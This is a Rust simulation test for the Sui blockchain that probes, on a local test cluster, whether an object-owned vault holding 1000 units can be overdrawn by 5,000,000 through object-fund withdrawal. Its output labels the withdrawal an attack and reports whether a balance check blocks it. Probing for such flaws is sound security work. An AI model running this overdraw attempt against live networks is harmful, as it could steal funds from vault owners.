use std::sync::Arc;
use sui_macros::sim_test;
use sui_protocol_config::ProtocolConfig;
use sui_test_transaction_builder::FundSource;
use sui_types::effects::TransactionEffectsAPI;
use test_cluster::TestClusterBuilder;

#[sim_test]
async fn test_no_balance_check_on_object_withdrawal() {
    let _guard = ProtocolConfig::apply_overrides_for_testing(|_, mut cfg| {
        cfg.create_root_accumulator_object_for_testing();
        cfg.enable_accumulators_for_testing();
        cfg.set_enable_object_funds_withdraw_for_testing(true);
        cfg
    });

    let test_cluster = Arc::new(TestClusterBuilder::new().build().await);
    let sender = test_cluster.get_address_0();

    let publish_tx = test_cluster
        .test_transaction_builder_with_sender(sender)
        .await
        .publish_examples("object_balance")
        .await
        .build();
    let response = test_cluster.sign_and_execute_transaction(&publish_tx).await;
    let package_id = response.get_new_package_obj().unwrap().0;
    println!("[1] Package: {}", package_id);

    let mut builder = test_cluster
        .test_transaction_builder_with_sender(sender)
        .await;
    builder = builder.move_call(package_id, "object_balance", "new_owned", vec![]);
    let tx = builder.build();
    let effects = test_cluster.sign_and_execute_transaction(&tx).await.effects;
    let vault_object = effects.created().first().cloned().unwrap().0;
    println!("[2] Vault: {}", vault_object.0);

    let gas_object = test_cluster
        .wallet
        .get_one_gas_object_owned_by_address(sender)
        .await
        .unwrap()
        .unwrap();
    let tx = test_cluster
        .test_transaction_builder()
        .await
        .transfer_sui_to_address_balance(
            FundSource::Coin(gas_object),
            vec![(1000u64, vault_object.0.into())],
        )
        .build();
    test_cluster.sign_and_execute_transaction(&tx).await;
    println!("[3] Deposited 1000");

    let gas_coin = test_cluster
        .wallet
        .get_one_gas_object_owned_by_address(sender)
        .await
        .unwrap()
        .unwrap();
    let gas_ref = gas_coin.compute_object_reference();

    let tx = test_cluster
        .test_transaction_builder_with_gas_object(sender, gas_ref)
        .await
        .transfer_sui_to_address_balance(
            FundSource::object_fund_owned(package_id, vault_object),
            vec![(5_000_000u64, sender.into())],
        )
        .build();

    println!("[4] Attacking: withdraw 5,000,000 from vault with 1000...");
    let signed = test_cluster.sign_transaction(&tx).await;
    let result = test_cluster
        .wallet
        .execute_transaction_may_fail(signed)
        .await;

    match result {
        Ok(response) => {
            let effects = response.effects;
            println!("[5] TX Status: {:?}", effects.status());
            if effects.status().is_ok() {
                println!("\n[CRITICAL] SUCCEEDED — No balance check detected!");
            } else {
                println!("\n[SAFE] FAILED — Hidden defense triggered!");
                println!("       Details: {:?}", effects.status());
            }
        }
        Err(e) => println!("[ERROR] Execution error: {:?}", e),
    }
}
